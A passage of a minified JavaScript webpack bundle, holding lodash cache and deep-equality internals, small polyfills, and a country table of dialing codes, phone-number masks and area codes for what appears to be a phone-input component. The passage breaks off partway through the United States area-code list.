        function St(v, T) {
            for (var D = v.length; D--; )
                if (ye(v[D][0], T))
                    return D;
            return -1
        }
        ee.prototype.clear = function() {
            this.__data__ = ae ? ae(null) : {}
        }
        ,
        ee.prototype.delete = function(v) {
            return this.has(v) && delete this.__data__[v]
        }
        ,
        ee.prototype.get = function(v) {
            var T = this.__data__;
            if (ae) {
                var D = T[v];
                return D === "__lodash_hash_undefined__" ? void 0 : D
            }
            return W.call(T, v) ? T[v] : void 0
        }
        ,
        ee.prototype.has = function(v) {
            var T = this.__data__;
            return ae ? T[v] !== void 0 : W.call(T, v)
        }
        ,
        ee.prototype.set = function(v, T) {
            return this.__data__[v] = ae && T === void 0 ? "__lodash_hash_undefined__" : T,
            this
        }
        ,
        oe.prototype.clear = function() {
            this.__data__ = []
        }
        ,
        oe.prototype.delete = function(v) {
            var T = this.__data__
              , D = St(T, v);
            return !(D < 0) && (D == T.length - 1 ? T.pop() : Ue.call(T, D, 1),
            !0)
        }
        ,
        oe.prototype.get = function(v) {
            var T = this.__data__
              , D = St(T, v);
            return D < 0 ? void 0 : T[D][1]
        }
        ,
        oe.prototype.has = function(v) {
            return St(this.__data__, v) > -1
        }
        ,
        oe.prototype.set = function(v, T) {
            var D = this.__data__
              , B = St(D, v);
            return B < 0 ? D.push([v, T]) : D[B][1] = T,
            this
        }
        ,
        De.prototype.clear = function() {
            this.__data__ = {
                hash: new ee,
                map: new (tt || oe),
                string: new ee
            }
        }
        ,
        De.prototype.delete = function(v) {
            return ma(this, v).delete(v)
        }
        ,
        De.prototype.get = function(v) {
            return ma(this, v).get(v)
        }
        ,
        De.prototype.has = function(v) {
            return ma(this, v).has(v)
        }
        ,
        De.prototype.set = function(v, T) {
            return ma(this, v).set(v, T),
            this
        }
        ,
        Pt.prototype.add = Pt.prototype.push = function(v) {
            return this.__data__.set(v, "__lodash_hash_undefined__"),
            this
        }
        ,
        Pt.prototype.has = function(v) {
            return this.__data__.has(v)
        }
        ,
        ut.prototype.clear = function() {
            this.__data__ = new oe
        }
        ,
        ut.prototype.delete = function(v) {
            return this.__data__.delete(v)
        }
        ,
        ut.prototype.get = function(v) {
            return this.__data__.get(v)
        }
        ,
        ut.prototype.has = function(v) {
            return this.__data__.has(v)
        }
        ,
        ut.prototype.set = function(v, T) {
            var D = this.__data__;
            if (D instanceof oe) {
                var B = D.__data__;
                if (!tt || B.length < 199)
                    return B.push([v, T]),
                    this;
                D = this.__data__ = new De(B)
            }
            return D.set(v, T),
            this
        }
        ;
        var mn, at = (mn = function(v, T) {
            return v && L(v, T, We)
        }
        ,
        function(v, T) {
            if (v == null)
                return v;
            if (!ie(v))
                return mn(v, T);
            for (var D = v.length, B = -1, ve = Object(v); ++B < D && T(ve[B], B, ve) !== !1; )
                ;
            return v
        }
        ), L = function(v) {
            return function(T, D, B) {
                for (var ve = -1, he = Object(T), ke = B(T), Ye = ke.length; Ye--; ) {
                    var Qe = ke[++ve];
                    if (D(he[Qe], Qe, he) === !1)
                        break
                }
                return T
            }
        }();
        function ne(v, T) {
            for (var D = 0, B = (T = ga(T, v) ? [T] : Ci(T)).length; v != null && D < B; )
                v = v[R(T[D++])];
            return D && D == B ? v : void 0
        }
        function wt(v, T) {
            return v != null && T in Object(v)
        }
        function ct(v, T, D, B, ve) {
            return v === T || (v == null || T == null || !Ie(v) && !Be(T) ? v != v && T != T : function(he, ke, Ye, Qe, pe, we) {
                var Et = Z(he)
                  , gt = Z(ke)
                  , ze = "[object Array]"
                  , ot = "[object Array]";
                Et || (ze = (ze = tn(he)) == o ? s : ze),
                gt || (ot = (ot = tn(ke)) == o ? s : ot);
                var Kt = ze == s && !Te(he)
                  , rr = ot == s && !Te(ke)
                  , ar = ze == ot;
                if (ar && !Kt)
                    return we || (we = new ut),
                    Et || Ze(he) ? uo(he, ke, Ye, Qe, pe, we) : function(nt, qe, Rl, Fr, ji, nn, Bn) {
                        switch (Rl) {
                        case "[object DataView]":
                            if (nt.byteLength != qe.byteLength || nt.byteOffset != qe.byteOffset)
                                return !1;
                            nt = nt.buffer,
                            qe = qe.buffer;
                        case "[object ArrayBuffer]":
                            return !(nt.byteLength != qe.byteLength || !Fr(new Ne(nt), new Ne(qe)));
                        case "[object Boolean]":
                        case "[object Date]":
                        case "[object Number]":
                            return ye(+nt, +qe);
                        case "[object Error]":
                            return nt.name == qe.name && nt.message == qe.message;
                        case "[object RegExp]":
                        case "[object String]":
                            return nt == qe + "";
                        case i:
                            var or = Ae;
                        case u:
                            var co = 2 & nn;
                            if (or || (or = H),
                            nt.size != qe.size && !co)
                                return !1;
                            var Ei = Bn.get(nt);
                            if (Ei)
                                return Ei == qe;
                            nn |= 1,
                            Bn.set(nt, qe);
                            var ya = uo(or(nt), or(qe), Fr, ji, nn, Bn);
                            return Bn.delete(nt),
                            ya;
                        case "[object Symbol]":
                            if (de)
                                return de.call(nt) == de.call(qe)
                        }
                        return !1
                    }(he, ke, ze, Ye, Qe, pe, we);
                if (!(2 & pe)) {
                    var ld = Kt && W.call(he, "__wrapped__")
                      , ud = rr && W.call(ke, "__wrapped__");
                    if (ld || ud) {
                        var M1 = ld ? he.value() : he
                          , D1 = ud ? ke.value() : ke;
                        return we || (we = new ut),
                        Ye(M1, D1, Qe, pe, we)
                    }
                }
                return ar ? (we || (we = new ut),
                function(nt, qe, Rl, Fr, ji, nn) {
                    var Bn = 2 & ji
                      , or = We(nt)
                      , co = or.length
                      , Ei = We(qe).length;
                    if (co != Ei && !Bn)
                        return !1;
                    for (var ya = co; ya--; ) {
                        var ir = or[ya];
                        if (!(Bn ? ir in qe : W.call(qe, ir)))
                            return !1
                    }
                    var cd = nn.get(nt);
                    if (cd && nn.get(qe))
                        return cd == qe;
                    var _i = !0;
                    nn.set(nt, qe),
                    nn.set(qe, nt);
                    for (var Al = Bn; ++ya < co; ) {
                        ir = or[ya];
                        var Ti = nt[ir]
                          , Pi = qe[ir];
                        if (Fr)
                            var fd = Bn ? Fr(Pi, Ti, ir, qe, nt, nn) : Fr(Ti, Pi, ir, nt, qe, nn);
                        if (!(fd === void 0 ? Ti === Pi || Rl(Ti, Pi, Fr, ji, nn) : fd)) {
                            _i = !1;
                            break
                        }
                        Al || (Al = ir == "constructor")
                    }
                    if (_i && !Al) {
                        var Oi = nt.constructor
                          , Ri = qe.constructor;
                        Oi == Ri || !("constructor"in nt) || !("constructor"in qe) || typeof Oi == "function" && Oi instanceof Oi && typeof Ri == "function" && Ri instanceof Ri || (_i = !1)
                    }
                    return nn.delete(nt),
                    nn.delete(qe),
                    _i
                }(he, ke, Ye, Qe, pe, we)) : !1
            }(v, T, ct, D, B, ve))
        }
        function mt(v) {
            return !(!Ie(v) || function(T) {
                return !!Y && Y in T
            }(v)) && (re(v) || Te(v) ? xe : y).test(F(v))
        }
        function so(v) {
            return typeof v == "function" ? v : v == null ? ft : typeof v == "object" ? Z(v) ? function(B, ve) {
                return ga(B) && ki(ve) ? E(R(B), ve) : function(he) {
                    var ke = function(Ye, Qe, pe) {
                        var we = Ye == null ? void 0 : ne(Ye, Qe);
                        return we === void 0 ? pe : we
                    }(he, B);
                    return ke === void 0 && ke === ve ? function(Ye, Qe) {
                        return Ye != null && function(pe, we, Et) {
                            we = ga(we, pe) ? [we] : Ci(we);
                            for (var gt, ze = -1, ot = we.length; ++ze < ot; ) {
                                var Kt = R(we[ze]);
                                if (!(gt = pe != null && Et(pe, Kt)))
                                    break;
                                pe = pe[Kt]
                            }
                            return gt || !!(ot = pe ? pe.length : 0) && me(ot) && zr(Kt, ot) && (Z(pe) || Pe(pe))
                        }(Ye, Qe, wt)
                    }(he, B) : ct(ve, ke, void 0, 3)
                }
            }(v[0], v[1]) : function(B) {
                var ve = function(he) {
                    for (var ke = We(he), Ye = ke.length; Ye--; ) {
                        var Qe = ke[Ye]
                          , pe = he[Qe];
                        ke[Ye] = [Qe, pe, ki(pe)]
                    }
                    return ke
                }(B);
                return ve.length == 1 && ve[0][2] ? E(ve[0][0], ve[0][1]) : function(he) {
                    return he === B || function(ke, Ye, Qe, pe) {
                        var we = Qe.length
                          , Et = we;
                        if (ke == null)
                            return !Et;
                        for (ke = Object(ke); we--; ) {
                            var gt = Qe[we];
                            if (gt[2] ? gt[1] !== ke[gt[0]] : !(gt[0]in ke))
                                return !1
                        }
                        for (; ++we < Et; ) {
                            var ze = (gt = Qe[we])[0]
                              , ot = ke[ze]
                              , Kt = gt[1];
                            if (gt[2]) {
                                if (ot === void 0 && !(ze in ke))
                                    return !1
                            } else {
                                var rr = new ut, ar;
                                if (!(ar === void 0 ? ct(Kt, ot, pe, 3, rr) : ar))
                                    return !1
                            }
                        }
                        return !0
                    }(he, B, ve)
                }
            }(v) : ga(T = v) ? (D = R(T),
            function(B) {
                return B == null ? void 0 : B[D]
            }
            ) : function(B) {
                return function(ve) {
                    return ne(ve, B)
                }
            }(T);
            var T, D
        }
        function lo(v) {
            if (D = (T = v) && T.constructor,
            B = typeof D == "function" && D.prototype || z,
            T !== B)
                return Ce(v);
            var T, D, B, ve = [];
            for (var he in Object(v))
                W.call(v, he) && he != "constructor" && ve.push(he);
            return ve
        }
        function Ci(v) {
            return Z(v) ? v : _(v)
        }
        function uo(v, T, D, B, ve, he) {
            var ke = 2 & ve
              , Ye = v.length
              , Qe = T.length;
            if (Ye != Qe && !(ke && Qe > Ye))
                return !1;
            var pe = he.get(v);
            if (pe && he.get(T))
                return pe == T;
            var we = -1
              , Et = !0
              , gt = 1 & ve ? new Pt : void 0;
            for (he.set(v, T),
            he.set(T, v); ++we < Ye; ) {
                var ze = v[we]
                  , ot = T[we];
                if (B)
                    var Kt = ke ? B(ot, ze, we, T, v, he) : B(ze, ot, we, v, T, he);
                if (Kt !== void 0) {
                    if (Kt)
                        continue;
                    Et = !1;
                    break
                }
                if (gt) {
                    if (!$(T, function(rr, ar) {
                        if (!gt.has(ar) && (ze === rr || D(ze, rr, B, ve, he)))
                            return gt.add(ar)
                    })) {
                        Et = !1;
                        break
                    }
                } else if (ze !== ot && !D(ze, ot, B, ve, he)) {
                    Et = !1;
                    break
                }
            }
            return he.delete(v),
            he.delete(T),
            Et
        }
        function ma(v, T) {
            var D, B, ve = v.__data__;
            return ((B = typeof (D = T)) == "string" || B == "number" || B == "symbol" || B == "boolean" ? D !== "__proto__" : D === null) ? ve[typeof T == "string" ? "string" : "hash"] : ve.map
        }
        function Un(v, T) {
            var D = function(B, ve) {
                return B == null ? void 0 : B[ve]
            }(v, T);
            return mt(D) ? D : void 0
        }
        var tn = function(v) {
            return b.call(v)
        };
        function zr(v, T) {
            return !!(T = T ?? 9007199254740991) && (typeof v == "number" || S.test(v)) && v > -1 && v % 1 == 0 && v < T
        }
        function ga(v, T) {
            if (Z(v))
                return !1;
            var D = typeof v;
            return !(D != "number" && D != "symbol" && D != "boolean" && v != null && !Nt(v)) || f.test(v) || !c.test(v) || T != null && v in Object(T)
        }
        function ki(v) {
            return v == v && !Ie(v)
        }
        function E(v, T) {
            return function(D) {
                return D != null && D[v] === T && (T !== void 0 || v in Object(D))
            }
        }
        (Me && tn(new Me(new ArrayBuffer(1))) != "[object DataView]" || tt && tn(new tt) != i || Xe && tn(Xe.resolve()) != "[object Promise]" || O && tn(new O) != u || U && tn(new U) != "[object WeakMap]") && (tn = function(v) {
            var T = b.call(v)
              , D = T == s ? v.constructor : void 0
              , B = D ? F(D) : void 0;
            if (B)
                switch (B) {
                case je:
                    return "[object DataView]";
                case be:
                    return i;
                case _e:
                    return "[object Promise]";
                case Oe:
                    return u;
                case Ke:
                    return "[object WeakMap]"
                }
            return T
        }
        );
        var _ = te(function(v) {
            var T;
            v = (T = v) == null ? "" : function(B) {
                if (typeof B == "string")
                    return B;
                if (Nt(B))
                    return Re ? Re.call(B) : "";
                var ve = B + "";
                return ve == "0" && 1 / B == -1 / 0 ? "-0" : ve
            }(T);
            var D = [];
            return d.test(v) && D.push(""),
            v.replace(h, function(B, ve, he, ke) {
                D.push(he ? ke.replace(N, "$1") : ve || B)
            }),
            D
        });
        function R(v) {
            if (typeof v == "string" || Nt(v))
                return v;
            var T = v + "";
            return T == "0" && 1 / v == -1 / 0 ? "-0" : T
        }
        function F(v) {
            if (v != null) {
                try {
                    return ge.call(v)
                } catch {}
                try {
                    return v + ""
                } catch {}
            }
            return ""
        }
        function te(v, T) {
            if (typeof v != "function" || T && typeof T != "function")
                throw new TypeError("Expected a function");
            var D = function() {
                var B = arguments
                  , ve = T ? T.apply(this, B) : B[0]
                  , he = D.cache;
                if (he.has(ve))
                    return he.get(ve);
                var ke = v.apply(this, B);
                return D.cache = he.set(ve, ke),
                ke
            };
            return D.cache = new (te.Cache || De),
            D
        }
        function ye(v, T) {
            return v === T || v != v && T != T
        }
        function Pe(v) {
            return function(T) {
                return Be(T) && ie(T)
            }(v) && W.call(v, "callee") && (!$e.call(v, "callee") || b.call(v) == o)
        }
        te.Cache = De;
        var Z = Array.isArray;
        function ie(v) {
            return v != null && me(v.length) && !re(v)
        }
        function re(v) {
            var T = Ie(v) ? b.call(v) : "";
            return T == "[object Function]" || T == "[object GeneratorFunction]"
        }
        function me(v) {
            return typeof v == "number" && v > -1 && v % 1 == 0 && v <= 9007199254740991
        }
        function Ie(v) {
            var T = typeof v;
            return !!v && (T == "object" || T == "function")
        }
        function Be(v) {
            return !!v && typeof v == "object"
        }
        function Nt(v) {
            return typeof v == "symbol" || Be(v) && b.call(v) == "[object Symbol]"
        }
        var Ze = P ? function(v) {
            return function(T) {
                return v(T)
            }
        }(P) : function(v) {
            return Be(v) && me(v.length) && !!x[b.call(v)]
        }
        ;
        function We(v) {
            return ie(v) ? Lt(v) : lo(v)
        }
        function ft(v) {
            return v
        }
        a.exports = function(v, T, D) {
            var B = Z(v) ? K : Se
              , ve = arguments.length < 3;
            return B(v, so(T), D, ve, at)
        }
    }
    ).call(this, n(3), n(7)(e))
}
, function(e, t) {
    e.exports = function(n) {
        return n.webpackPolyfill || (n.deprecate = function() {}
        ,
        n.paths = [],
        n.children || (n.children = []),
        Object.defineProperty(n, "loaded", {
            enumerable: !0,
            get: function() {
                return n.l
            }
        }),
        Object.defineProperty(n, "id", {
            enumerable: !0,
            get: function() {
                return n.i
            }
        }),
        n.webpackPolyfill = 1),
        n
    }
}
, function(e, t) {
    String.prototype.padEnd || (String.prototype.padEnd = function(n, r) {
        return n >>= 0,
        r = String(r !== void 0 ? r : " "),
        this.length > n ? String(this) : ((n -= this.length) > r.length && (r += r.repeat(n / r.length)),
        String(this) + r.slice(0, n))
    }
    )
}
, function(e, t, n) {
    function r(z, M, Y) {
        return M in z ? Object.defineProperty(z, M, {
            value: Y,
            enumerable: !0,
            configurable: !0,
            writable: !0
        }) : z[M] = Y,
        z
    }
    function a(z) {
        if (Symbol.iterator in Object(z) || Object.prototype.toString.call(z) === "[object Arguments]")
            return Array.from(z)
    }
    function o(z) {
        return function(M) {
            if (Array.isArray(M)) {
                for (var Y = 0, ge = new Array(M.length); Y < M.length; Y++)
                    ge[Y] = M[Y];
                return ge
            }
        }(z) || a(z) || function() {
            throw new TypeError("Invalid attempt to spread non-iterable instance")
        }()
    }
    function i(z) {
        if (Array.isArray(z))
            return z
    }
    function s() {
        throw new TypeError("Invalid attempt to destructure non-iterable instance")
    }
    function u(z, M) {
        if (!(z instanceof M))
            throw new TypeError("Cannot call a class as a function")
    }
    function c(z, M) {
        for (var Y = 0; Y < M.length; Y++) {
            var ge = M[Y];
            ge.enumerable = ge.enumerable || !1,
            ge.configurable = !0,
            "value"in ge && (ge.writable = !0),
            Object.defineProperty(z, ge.key, ge)
        }
    }
    function f(z) {
        return (f = typeof Symbol == "function" && typeof Symbol.iterator == "symbol" ? function(M) {
            return typeof M
        }
        : function(M) {
            return M && typeof Symbol == "function" && M.constructor === Symbol && M !== Symbol.prototype ? "symbol" : typeof M
        }
        )(z)
    }
    function d(z) {
        return (d = typeof Symbol == "function" && f(Symbol.iterator) === "symbol" ? function(M) {
            return f(M)
        }
        : function(M) {
            return M && typeof Symbol == "function" && M.constructor === Symbol && M !== Symbol.prototype ? "symbol" : f(M)
        }
        )(z)
    }
    function h(z) {
        if (z === void 0)
            throw new ReferenceError("this hasn't been initialised - super() hasn't been called");
        return z
    }
    function N(z) {
        return (N = Object.setPrototypeOf ? Object.getPrototypeOf : function(M) {
            return M.__proto__ || Object.getPrototypeOf(M)
        }
        )(z)
    }
    function y(z, M) {
        return (y = Object.setPrototypeOf || function(Y, ge) {
            return Y.__proto__ = ge,
            Y
        }
        )(z, M)
    }
    n.r(t);
    var S = n(0)
      , x = n.n(S)
      , g = n(5)
      , p = n.n(g)
      , m = n(4)
      , C = n.n(m)
      , k = n(6)
      , w = n.n(k)
      , A = n(2)
      , P = n.n(A)
      , K = n(1)
      , $ = n.n(K);
    n(8);
    function Se(z, M) {
        return i(z) || function(Y, ge) {
            var W = []
              , b = !0
              , xe = !1
              , ce = void 0;
            try {
                for (var Ne, $e = Y[Symbol.iterator](); !(b = (Ne = $e.next()).done) && (W.push(Ne.value),
                !ge || W.length !== ge); b = !0)
                    ;
            } catch (Ue) {
                xe = !0,
                ce = Ue
            } finally {
                try {
                    b || $e.return == null || $e.return()
                } finally {
                    if (xe)
                        throw ce
                }
            }
            return W
        }(z, M) || s()
    }
    var Te = [["Afghanistan", ["asia"], "af", "93"], ["Albania", ["europe"], "al", "355"], ["Algeria", ["africa", "north-africa"], "dz", "213"], ["Andorra", ["europe"], "ad", "376"], ["Angola", ["africa"], "ao", "244"], ["Antigua and Barbuda", ["america", "carribean"], "ag", "1268"], ["Argentina", ["america", "south-america"], "ar", "54", "(..) ........", 0, ["11", "221", "223", "261", "264", "2652", "280", "2905", "291", "2920", "2966", "299", "341", "342", "343", "351", "376", "379", "381", "3833", "385", "387", "388"]], ["Armenia", ["asia", "ex-ussr"], "am", "374", ".. ......"], ["Aruba", ["america", "carribean"], "aw", "297"], ["Australia", ["oceania"], "au", "61", "(..) .... ....", 0, ["2", "3", "4", "7", "8", "02", "03", "04", "07", "08"]], ["Austria", ["europe", "eu-union"], "at", "43"], ["Azerbaijan", ["asia", "ex-ussr"], "az", "994", "(..) ... .. .."], ["Bahamas", ["america", "carribean"], "bs", "1242"], ["Bahrain", ["middle-east"], "bh", "973"], ["Bangladesh", ["asia"], "bd", "880"], ["Barbados", ["america", "carribean"], "bb", "1246"], ["Belarus", ["europe", "ex-ussr"], "by", "375", "(..) ... .. .."], ["Belgium", ["europe", "eu-union"], "be", "32", "... .. .. .."], ["Belize", ["america", "central-america"], "bz", "501"], ["Benin", ["africa"], "bj", "229"], ["Bhutan", ["asia"], "bt", "975"], ["Bolivia", ["america", "south-america"], "bo", "591"], ["Bosnia and Herzegovina", ["europe", "ex-yugos"], "ba", "387"], ["Botswana", ["africa"], "bw", "267"], ["Brazil", ["america", "south-america"], "br", "55", "(..) ........."], ["British Indian Ocean Territory", ["asia"], "io", "246"], ["Brunei", ["asia"], "bn", "673"], ["Bulgaria", ["europe", "eu-union"], "bg", "359"], ["Burkina Faso", ["africa"], "bf", "226"], ["Burundi", ["africa"], "bi", "257"], ["Cambodia", ["asia"], "kh", "855"], ["Cameroon", ["africa"], "cm", "237"], ["Canada", ["america", "north-america"], "ca", "1", "(...) ...-....", 1, ["204", "226", "236", "249", "250", "289", "306", "343", "365", "387", "403", "416", "418", "431", "437", "438", "450", "506", "514", "519", "548", "579", "581", "587", "604", "613", "639", "647", "672", "705", "709", "742", "778", "780", "782", "807", "819", "825", "867", "873", "902", "905"]], ["Cape Verde", ["africa"], "cv", "238"], ["Caribbean Netherlands", ["america", "carribean"], "bq", "599", "", 1], ["Central African Republic", ["africa"], "cf", "236"], ["Chad", ["africa"], "td", "235"], ["Chile", ["america", "south-america"], "cl", "56"], ["China", ["asia"], "cn", "86", "..-........."], ["Colombia", ["america", "south-america"], "co", "57", "... ... ...."], ["Comoros", ["africa"], "km", "269"], ["Congo", ["africa"], "cd", "243"], ["Congo", ["africa"], "cg", "242"], ["Costa Rica", ["america", "central-america"], "cr", "506", "....-...."], ["Côte d’Ivoire", ["africa"], "ci", "225", ".. .. .. .."], ["Croatia", ["europe", "eu-union", "ex-yugos"], "hr", "385"], ["Cuba", ["america", "carribean"], "cu", "53"], ["Curaçao", ["america", "carribean"], "cw", "599", "", 0], ["Cyprus", ["europe", "eu-union"], "cy", "357", ".. ......"], ["Czech Republic", ["europe", "eu-union"], "cz", "420", "... ... ..."], ["Denmark", ["europe", "eu-union", "baltic"], "dk", "45", ".. .. .. .."], ["Djibouti", ["africa"], "dj", "253"], ["Dominica", ["america", "carribean"], "dm", "1767"], ["Dominican Republic", ["america", "carribean"], "do", "1", "", 2, ["809", "829", "849"]], ["Ecuador", ["america", "south-america"], "ec", "593"], ["Egypt", ["africa", "north-africa"], "eg", "20"], ["El Salvador", ["america", "central-america"], "sv", "503", "....-...."], ["Equatorial Guinea", ["africa"], "gq", "240"], ["Eritrea", ["africa"], "er", "291"], ["Estonia", ["europe", "eu-union", "ex-ussr", "baltic"], "ee", "372", ".... ......"], ["Ethiopia", ["africa"], "et", "251"], ["Fiji", ["oceania"], "fj", "679"], ["Finland", ["europe", "eu-union", "baltic"], "fi", "358", ".. ... .. .."], ["France", ["europe", "eu-union"], "fr", "33", ". .. .. .. .."], ["French Guiana", ["america", "south-america"], "gf", "594"], ["French Polynesia", ["oceania"], "pf", "689"], ["Gabon", ["africa"], "ga", "241"], ["Gambia", ["africa"], "gm", "220"], ["Georgia", ["asia", "ex-ussr"], "ge", "995"], ["Germany", ["europe", "eu-union", "baltic"], "de", "49", ".... ........"], ["Ghana", ["africa"], "gh", "233"], ["Greece", ["europe", "eu-union"], "gr", "30"], ["Grenada", ["america", "carribean"], "gd", "1473"], ["Guadeloupe", ["america", "carribean"], "gp", "590", "", 0], ["Guam", ["oceania"], "gu", "1671"], ["Guatemala", ["america", "central-america"], "gt", "502", "....-...."], ["Guinea", ["africa"], "gn", "224"], ["Guinea-Bissau", ["africa"], "gw", "245"], ["Guyana", ["america", "south-america"], "gy", "592"], ["Haiti", ["america", "carribean"], "ht", "509", "....-...."], ["Honduras", ["america", "central-america"], "hn", "504"], ["Hong Kong", ["asia"], "hk", "852", ".... ...."], ["Hungary", ["europe", "eu-union"], "hu", "36"], ["Iceland", ["europe"], "is", "354", "... ...."], ["India", ["asia"], "in", "91", ".....-....."], ["Indonesia", ["asia"], "id", "62"], ["Iran", ["middle-east"], "ir", "98", "... ... ...."], ["Iraq", ["middle-east"], "iq", "964"], ["Ireland", ["europe", "eu-union"], "ie", "353", ".. ......."], ["Israel", ["middle-east"], "il", "972", "... ... ...."], ["Italy", ["europe", "eu-union"], "it", "39", "... .......", 0], ["Jamaica", ["america", "carribean"], "jm", "1876"], ["Japan", ["asia"], "jp", "81", ".. .... ...."], ["Jordan", ["middle-east"], "jo", "962"], ["Kazakhstan", ["asia", "ex-ussr"], "kz", "7", "... ...-..-..", 1, ["310", "311", "312", "313", "315", "318", "321", "324", "325", "326", "327", "336", "7172", "73622"]], ["Kenya", ["africa"], "ke", "254"], ["Kiribati", ["oceania"], "ki", "686"], ["Kosovo", ["europe", "ex-yugos"], "xk", "383"], ["Kuwait", ["middle-east"], "kw", "965"], ["Kyrgyzstan", ["asia", "ex-ussr"], "kg", "996", "... ... ..."], ["Laos", ["asia"], "la", "856"], ["Latvia", ["europe", "eu-union", "ex-ussr", "baltic"], "lv", "371", ".. ... ..."], ["Lebanon", ["middle-east"], "lb", "961"], ["Lesotho", ["africa"], "ls", "266"], ["Liberia", ["africa"], "lr", "231"], ["Libya", ["africa", "north-africa"], "ly", "218"], ["Liechtenstein", ["europe"], "li", "423"], ["Lithuania", ["europe", "eu-union", "ex-ussr", "baltic"], "lt", "370"], ["Luxembourg", ["europe", "eu-union"], "lu", "352"], ["Macau", ["asia"], "mo", "853"], ["Macedonia", ["europe", "ex-yugos"], "mk", "389"], ["Madagascar", ["africa"], "mg", "261"], ["Malawi", ["africa"], "mw", "265"], ["Malaysia", ["asia"], "my", "60", "..-....-...."], ["Maldives", ["asia"], "mv", "960"], ["Mali", ["africa"], "ml", "223"], ["Malta", ["europe", "eu-union"], "mt", "356"], ["Marshall Islands", ["oceania"], "mh", "692"], ["Martinique", ["america", "carribean"], "mq", "596"], ["Mauritania", ["africa"], "mr", "222"], ["Mauritius", ["africa"], "mu", "230"], ["Mexico", ["america", "central-america"], "mx", "52", "... ... ....", 0, ["55", "81", "33", "656", "664", "998", "774", "229"]], ["Micronesia", ["oceania"], "fm", "691"], ["Moldova", ["europe"], "md", "373", "(..) ..-..-.."], ["Monaco", ["europe"], "mc", "377"], ["Mongolia", ["asia"], "mn", "976"], ["Montenegro", ["europe", "ex-yugos"], "me", "382"], ["Morocco", ["africa", "north-africa"], "ma", "212"], ["Mozambique", ["africa"], "mz", "258"], ["Myanmar", ["asia"], "mm", "95"], ["Namibia", ["africa"], "na", "264"], ["Nauru", ["africa"], "nr", "674"], ["Nepal", ["asia"], "np", "977"], ["Netherlands", ["europe", "eu-union"], "nl", "31", ".. ........"], ["New Caledonia", ["oceania"], "nc", "687"], ["New Zealand", ["oceania"], "nz", "64", "...-...-...."], ["Nicaragua", ["america", "central-america"], "ni", "505"], ["Niger", ["africa"], "ne", "227"], ["Nigeria", ["africa"], "ng", "234"], ["North Korea", ["asia"], "kp", "850"], ["Norway", ["europe", "baltic"], "no", "47", "... .. ..."], ["Oman", ["middle-east"], "om", "968"], ["Pakistan", ["asia"], "pk", "92", "...-......."], ["Palau", ["oceania"], "pw", "680"], ["Palestine", ["middle-east"], "ps", "970"], ["Panama", ["america", "central-america"], "pa", "507"], ["Papua New Guinea", ["oceania"], "pg", "675"], ["Paraguay", ["america", "south-america"], "py", "595"], ["Peru", ["america", "south-america"], "pe", "51"], ["Philippines", ["asia"], "ph", "63", ".... ......."], ["Poland", ["europe", "eu-union", "baltic"], "pl", "48", "...-...-..."], ["Portugal", ["europe", "eu-union"], "pt", "351"], ["Puerto Rico", ["america", "carribean"], "pr", "1", "", 3, ["787", "939"]], ["Qatar", ["middle-east"], "qa", "974"], ["Réunion", ["africa"], "re", "262"], ["Romania", ["europe", "eu-union"], "ro", "40"], ["Russia", ["europe", "asia", "ex-ussr", "baltic"], "ru", "7", "(...) ...-..-..", 0], ["Rwanda", ["africa"], "rw", "250"], ["Saint Kitts and Nevis", ["america", "carribean"], "kn", "1869"], ["Saint Lucia", ["america", "carribean"], "lc", "1758"], ["Saint Vincent and the Grenadines", ["america", "carribean"], "vc", "1784"], ["Samoa", ["oceania"], "ws", "685"], ["San Marino", ["europe"], "sm", "378"], ["São Tomé and Príncipe", ["africa"], "st", "239"], ["Saudi Arabia", ["middle-east"], "sa", "966"], ["Senegal", ["africa"], "sn", "221"], ["Serbia", ["europe", "ex-yugos"], "rs", "381"], ["Seychelles", ["africa"], "sc", "248"], ["Sierra Leone", ["africa"], "sl", "232"], ["Singapore", ["asia"], "sg", "65", "....-...."], ["Slovakia", ["europe", "eu-union"], "sk", "421"], ["Slovenia", ["europe", "eu-union", "ex-yugos"], "si", "386"], ["Solomon Islands", ["oceania"], "sb", "677"], ["Somalia", ["africa"], "so", "252"], ["South Africa", ["africa"], "za", "27"], ["South Korea", ["asia"], "kr", "82", "... .... ...."], ["South Sudan", ["africa", "north-africa"], "ss", "211"], ["Spain", ["europe", "eu-union"], "es", "34", "... ... ..."], ["Sri Lanka", ["asia"], "lk", "94"], ["Sudan", ["africa"], "sd", "249"], ["Suriname", ["america", "south-america"], "sr", "597"], ["Swaziland", ["africa"], "sz", "268"], ["Sweden", ["europe", "eu-union", "baltic"], "se", "46", "(...) ...-..."], ["Switzerland", ["europe"], "ch", "41", ".. ... .. .."], ["Syria", ["middle-east"], "sy", "963"], ["Taiwan", ["asia"], "tw", "886"], ["Tajikistan", ["asia", "ex-ussr"], "tj", "992"], ["Tanzania", ["africa"], "tz", "255"], ["Thailand", ["asia"], "th", "66"], ["Timor-Leste", ["asia"], "tl", "670"], ["Togo", ["africa"], "tg", "228"], ["Tonga", ["oceania"], "to", "676"], ["Trinidad and Tobago", ["america", "carribean"], "tt", "1868"], ["Tunisia", ["africa", "north-africa"], "tn", "216"], ["Turkey", ["europe"], "tr", "90", "... ... .. .."], ["Turkmenistan", ["asia", "ex-ussr"], "tm", "993"], ["Tuvalu", ["asia"], "tv", "688"], ["Uganda", ["africa"], "ug", "256"], ["Ukraine", ["europe", "ex-ussr"], "ua", "380", "(..) ... .. .."], ["United Arab Emirates", ["middle-east"], "ae", "971"], ["United Kingdom", ["europe", "eu-union"], "gb", "44", ".... ......"], ["United States", ["america", "north-america"], "us", "1", "(...) ...-....", 0, ["907", "205", "251", "256", "334", "479", "501", "870", "480", "520", "602", "623", "928", "209", "213", "310", "323", "408", "415", "510", "530", "559", "562", "619", "626", "650", "661", "707", "714", "760", "805", "818", "831", "858", "909", "916", "925", "949", "951", "303", "719", "970", "203", "860", "202", "302", "239", "305", "321", "352", "386", "407", "561", "727", "772", "813", "850", "863", "904", "941", "954", "229", "404", "478", "706", "770", "912", "808", "319", "515", "563", "641", "712", "208", "217", "309", "312", "618", "630", "708", "773", "815", "847", "219", "260", "317", "574", "765", "812", "316", "620", "785", "913", "270", "502", "606", "859", "225", "318", "337", "504", "985", "413", "508", "617", "781", "978", "301", "410", "207", "231", "248", "269", "313", "517", "586", "616", "734", "810", "906", "989", "218", "320", "507", "612", "651", "763", "952", "314", "417", "573", "636", "660", "816", "228", "601", "662", "406", "252", "336", "704", "828", "910", "919", "701", "308", "402", "603", "201", "609", "732", "856", "908", "973", "505", "575", "702", "775", "212", "315", "516", "518", "585", "607", "631", "716", "718", "845", "914", "216", "330", "419", "440", "513", "614", "740", "937", "405", "580", 